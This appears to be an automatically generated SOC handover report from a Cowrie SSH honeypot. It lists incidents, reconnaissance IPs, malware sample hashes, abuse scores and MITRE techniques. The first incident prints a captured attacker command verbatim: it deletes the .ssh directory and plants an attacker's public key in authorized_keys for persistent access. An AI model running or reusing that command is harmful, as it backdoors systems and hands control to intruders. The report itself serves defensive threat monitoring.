| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-29 13:56 |
| **Last Seen** | 2026-05-29 13:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:56:19` | `cowrie.session.connect` |
| `2026-05-29 13:56:19` | `cowrie.client.version` |
| `2026-05-29 13:56:19` | `cowrie.client.kex` |
| `2026-05-29 13:56:20` | `cowrie.login.success` |
| `2026-05-29 13:56:20` | `cowrie.session.params` |
| `2026-05-29 13:56:20` | `cowrie.command.input` |
| `2026-05-29 13:56:20` | `cowrie.command.failed` |
| `2026-05-29 13:56:20` | `cowrie.log.closed` |
| `2026-05-29 13:56:20` | `cowrie.session.params` |
| `2026-05-29 13:56:20` | `cowrie.command.input` |
| `2026-05-29 13:56:21` | `cowrie.session.file_download` |
| `2026-05-29 13:56:21` | `cowrie.log.closed` |
| `2026-05-29 13:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52f6cbeca867

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-29 13:56 |
| **Last Seen** | 2026-05-29 13:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:56:23` | `cowrie.session.connect` |
| `2026-05-29 13:56:23` | `cowrie.client.version` |
| `2026-05-29 13:56:23` | `cowrie.client.kex` |
| `2026-05-29 13:56:23` | `cowrie.login.success` |
| `2026-05-29 13:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `135.148.33[.]168` | **276** | 2026-05-29 12:52 | 2026-05-29 17:35 | 174m | 0 | `T1592` | 🟠 MEDIUM |
| `149.255.39[.]70` | **42** | 2026-05-29 12:49 | 2026-05-29 16:12 | 27m | 0 | `T1592` | 🟠 MEDIUM |
| `206.189.25[.]100` | **21** | 2026-05-29 13:01 | 2026-05-29 16:51 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `180.188.45[.]179` | **17** | 2026-05-29 12:49 | 2026-05-29 13:22 | 30m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `111.238.174[.]6` | **16** | 2026-05-29 13:44 | 2026-05-29 13:58 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.122[.]158` | **16** | 2026-05-29 12:55 | 2026-05-29 13:24 | 24m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.23.104[.]96` | **3** | 2026-05-29 12:59 | 2026-05-29 12:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `38.121.214[.]147` | **3** | 2026-05-29 13:15 | 2026-05-29 13:17 | 6m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]148` | **2** | 2026-05-29 15:10 | 2026-05-29 15:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]149` | **2** | 2026-05-29 14:08 | 2026-05-29 14:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `61.240.17[.]66` | **2** | 2026-05-29 15:27 | 2026-05-29 15:31 | 4m | 0 | `T1592` | 🟢 LOW |
| `76.37.249[.]138` | **2** | 2026-05-29 17:16 | 2026-05-29 17:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.32.240[.]31` | 1 | 2026-05-29 13:41 | 2026-05-29 13:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.38.195[.]164` | 1 | 2026-05-29 16:32 | 2026-05-29 16:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `138.68.20[.]220` | 1 | 2026-05-29 13:13 | 2026-05-29 13:14 | 53s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]45` | 1 | 2026-05-29 16:01 | 2026-05-29 16:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-29 13:12 | 2026-05-29 13:13 | 44s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]110` | 1 | 2026-05-29 16:01 | 2026-05-29 16:02 | 10s | 0 | `T1592` | 🟢 LOW |
| `98.84.169[.]122` | 1 | 2026-05-29 13:09 | 2026-05-29 13:09 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.188.45[.]179` | CN | Xiamen Kuaikuai Network Technology Co.,Ltd | **100** ⚠️ | 5 |
| `5.226.140[.]110` | GB | Infrawatch Limited | **100** ⚠️ | 8 |
| `76.37.249[.]138` | US | Charter Communications Inc | **100** ⚠️ | 3 |
| `138.68.20[.]220` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `199.45.154[.]148` | HK | Censys, Inc. | **100** ⚠️ | 50 |
| `3.23.104[.]96` | US | Amazon Technologies Inc. | **100** ⚠️ | 36 |
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `38.121.214[.]147` | VE | GALANET SOLUTION C.A. | **100** ⚠️ | 0 |
| `188.240.59[.]45` | GB | Infrawatch Limited | **100** ⚠️ | 15 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (52 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 22 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 471 cases |
| Tool 34  | Credential Extractor        | ✅ 31 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 52 filtered (11.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 19 recon entry/entries in table (12 group(s) consolidating 402 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-29T17:37:25Z_
